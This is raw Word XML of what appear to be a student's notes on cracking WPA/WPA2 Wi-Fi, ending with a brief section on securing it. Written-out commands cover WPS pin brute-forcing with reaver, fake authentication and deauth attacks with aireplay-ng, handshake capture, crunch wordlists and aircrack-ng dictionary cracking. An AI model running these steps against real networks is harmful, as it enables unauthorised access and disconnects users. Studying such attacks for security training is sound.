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BBB69A" w14:textId="77777777" w:rsidR="00807843" w:rsidRDefault="00821128">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>WPA/WPA2 Cracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205904F8" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Very similar – can be cracked using the same methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12205B77" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128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WPS is a feature that we can use with WPA &amp; WPA2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E618EA3" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128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Allows clients to connect without the password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA9FC12" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128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Auth is done using an </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8 digit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37383E4B" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128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Can try all of these in a short time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BA918D" w14:textId="77777777" w:rsidR="00821128" w:rsidRDefault="00821128" w:rsidP="00821128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WPS pin can be used to compute the actual password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276E7A95" w14:textId="77777777" w:rsidR="00FC3297" w:rsidRDefault="00FC3297" w:rsidP="00FC3297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Can only work if it is configured not to use Push Button Authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54616DFC" w14:textId="77777777" w:rsidR="00FC3297" w:rsidRDefault="00FC3297" w:rsidP="00FC3297">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38C53DCE" w14:textId="77777777" w:rsidR="00FC3297" w:rsidRDefault="00FC3297" w:rsidP="00FC3297">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FC3297">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E0D8D6" w14:textId="77777777" w:rsidR="00FC3297" w:rsidRDefault="00FC3297" w:rsidP="00FC3297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Wash –interface mon0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EB4AC8" w14:textId="77777777" w:rsidR="00FC3297" w:rsidRDefault="00876F9C" w:rsidP="00FC3297">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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Aireplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-ng –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fakeauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 30 -a MAC ADDRESS OF TARGET/ BSSID -h MAC ADDRESS OF WIRELESS ADAPTER mon0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A0A79C" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00FC3297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Replace “-” to “:”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284AEB0F" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00FC3297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Run this command before the authentication attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D285AB1" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7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Reaver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> [] –channel [] –interface mon0 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> –no-associate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702C13A3" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C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When using mon0 this is just the name of the wireless network card – yours may. Be different</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FA3E29" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C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-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tells you information like why it may have gone wrong</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2FA51A" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07394141" w14:textId="3D68FCC4" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Capturing the handshake:</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="3A890ADE" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3672BF97" w14:textId="4E6A0A75" w:rsidR="00876F9C" w:rsidRDefault="00876F9C" w:rsidP="00876F9C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Airodump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-ng –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>] –channel[] –write[]</w:t>
      </w:r>
      <w:r w:rsidR="00B65566">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004467C5">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2CCEA2" w14:textId="77777777" w:rsidR="00876F9C" w:rsidRDefault="00B65566" w:rsidP="00B65566">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1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Now we have to wait for a client to connect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31000155" w14:textId="77777777" w:rsidR="00B65566" w:rsidRDefault="00B65566" w:rsidP="00B65566">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1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Instead of sitting and waiting we can use a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack to disconnect someone until we turn it off and then they will connect again allowing us to capture the handshake.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683FE3AE" w14:textId="4CF06B88" w:rsidR="00854E2F" w:rsidRDefault="00B65566" w:rsidP="00854E2F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Aireplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-ng –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4 -a TARGET BSSID -c CLENT</w:t>
      </w:r>
      <w:r w:rsidR="004467C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BSSID </w:t>
      </w:r>
      <w:r w:rsidR="004467C5">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760E8730" w14:textId="77777777" w:rsidR="00854E2F" w:rsidRDefault="00854E2F" w:rsidP="00854E2F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The handshake does not contain data that helps recover the key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26653BBE" w14:textId="77777777" w:rsidR="00854E2F" w:rsidRDefault="00854E2F" w:rsidP="00854E2F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It contains data that can be used to check if a key is valid or not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B1B2E1" w14:textId="77777777" w:rsidR="00854E2F" w:rsidRDefault="00854E2F" w:rsidP="00854E2F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002826D4" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00854E2F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F663243" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00854E2F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EA3045E" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00854E2F">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Creating a wordlist</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEB4BB6" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE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Crunch can be used </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C45C7B" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE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Crunch [min] [max] [characters]-t [pattern] -o[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>FileName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1CD2F1" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1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Crunch 6 8 123abc -wordlist -t a@@@@b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD555D9" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10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aaaaab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="064B27B3" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10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aabbbb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0C3EA48B" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10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aan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>$$b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3B29E8" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10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etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2AC39913" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CD4480B" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>man crunch – gives you info on how to use crunch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DC952D" w14:textId="77777777" w:rsidR="00011ADE" w:rsidRDefault="00011ADE" w:rsidP="00011ADE">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3753CE9E" w14:textId="779102CF" w:rsidR="00011ADE" w:rsidRPr="00804243" w:rsidRDefault="00804243" w:rsidP="00011ADE">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00804243">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Using a wordlist attack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1125AE9F" w14:textId="2378B091" w:rsidR="00804243" w:rsidRDefault="00804243" w:rsidP="00011ADE">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681A760D" w14:textId="73B6A9D5" w:rsidR="00804243" w:rsidRDefault="00804243" w:rsidP="00804243">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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aircrack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-ng NAME OF CAPTURE FILE</w:t>
      </w:r>
      <w:r w:rsidR="001F72DB">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (.cap file)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -w NAME OF WORDLIST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0263564A" w14:textId="7209D742" w:rsidR="001F72DB" w:rsidRDefault="001F72DB" w:rsidP="001F72DB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Can use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GPu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7E93EBFE" w14:textId="576913A9" w:rsidR="001F72DB" w:rsidRDefault="001F72DB" w:rsidP="001F72DB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Can use. Rainbow tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75242A42" w14:textId="665129F0" w:rsidR="001F72DB" w:rsidRDefault="001F72DB" w:rsidP="001F72DB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Online websites have super computers and huge word lists you can </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>use  online</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="52C2D053" w14:textId="36D43CAF" w:rsidR="001F72DB" w:rsidRDefault="001F72DB" w:rsidP="002B4CA2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0728C62B" w14:textId="13A143FA" w:rsidR="002B4CA2" w:rsidRPr="003B7FC0" w:rsidRDefault="002B4CA2" w:rsidP="002B4CA2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B7FC0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">How to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003B7FC0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>secuer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003B7FC0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003B7FC0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wpa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003B7FC0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>/wap2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB99168" w14:textId="500CBBA7" w:rsidR="002B4CA2" w:rsidRDefault="002B4CA2" w:rsidP="002B4CA2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Disable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – or use button confirmation for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1238F63B" w14:textId="4DE87B4B" w:rsidR="002B4CA2" w:rsidRDefault="002B4CA2" w:rsidP="002B4CA2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph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If this is disabled, then the only way to crack it is through a dictionary attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A478107" w14:textId="7197D443" w:rsidR="002B4CA2" w:rsidRDefault="002B4CA2" w:rsidP="003B7FC0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68B70686" w14:textId="77777777" w:rsidR="003B7FC0" w:rsidRPr="003B7FC0" w:rsidRDefault="003B7FC0" w:rsidP="003B7FC0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="003B7FC0" w:rsidRPr="003B7FC0">
      <w:footerReference w:type="default" r:id="rId7"/>
      <w:pgSz w:w="11907" w:h="16839" w:code="9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1D1E8C" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4729B3E1" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1BF3A65E" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4236A4" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E4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81F9289" w14:textId="77777777" w:rsidR="00807843" w:rsidRDefault="000F312B">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
        </w:pPr>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-GB" w:bidi="en-GB"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-GB" w:bidi="en-GB"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:lang w:val="en-GB" w:bidi="en-GB"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:lang w:val="en-GB" w:bidi="en-GB"/>
          </w:rPr>
          <w:t>0</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:lang w:val="en-GB" w:bidi="en-GB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69C0DB" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="29187284" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="2C867993" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E47">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF2C7DB" w14:textId="77777777" w:rsidR="00261E47" w:rsidRDefault="00261E4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AD137FE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CBE6F5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3A7BF8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5AB0AB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246CB7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="093212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9D3485"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="385EF4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2F75E1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="04F8F9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7C7942"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3C4EF8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0B78C6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="13168E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E06672"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D31211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10"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="7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9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128"/>
    <w:rsid w:val="00011ADE"/>
    <w:rsid w:val="000E16A3"/>
    <w:rsid w:val="000F312B"/>
    <w:rsid w:val="00110A21"/>
    <w:rsid w:val="001F72DB"/>
    <w:rsid w:val="00261E47"/>
    <w:rsid w:val="002B4CA2"/>
    <w:rsid w:val="003B7FC0"/>
    <w:rsid w:val="003E020F"/>
    <w:rsid w:val="004467C5"/>
    <w:rsid w:val="00793386"/>
    <w:rsid w:val="00804243"/>
    <w:rsid w:val="00807843"/>
    <w:rsid w:val="00821128"/>
    <w:rsid w:val="00854E2F"/>
    <w:rsid w:val="00876F9C"/>
    <w:rsid w:val="00B65566"/>
    <w:rsid w:val="00C61C56"/>
    <w:rsid w:val="00FC3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CB1EF1"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{EC8DB641-B835-A74A-8C76-D659B6D8A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  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="008211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thomasbyrne/Library/Containers/com.microsoft.Word/Data/Library/Application%20Support/Microsoft/Office/16.0/DTS/en-GB%7b47AA1D94-3408-1340-ACAE-6438B1A86372%7d/%7b4FE0F1B4-0475-BA40-9088-7973F65F2125%7dtf10002086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{4FE0F1B4-0475-BA40-9088-7973F65F2125}tf10002086.dotx</Template>
  <TotalTime>78</TotalTime>
  <Pages>2</Pages>
  <Words>274</Words>
  <Characters>1566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Thomas Byrne</cp:lastModifiedBy>
  <cp:revision>11</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-10-11T12:55:00Z</dcterms:created>
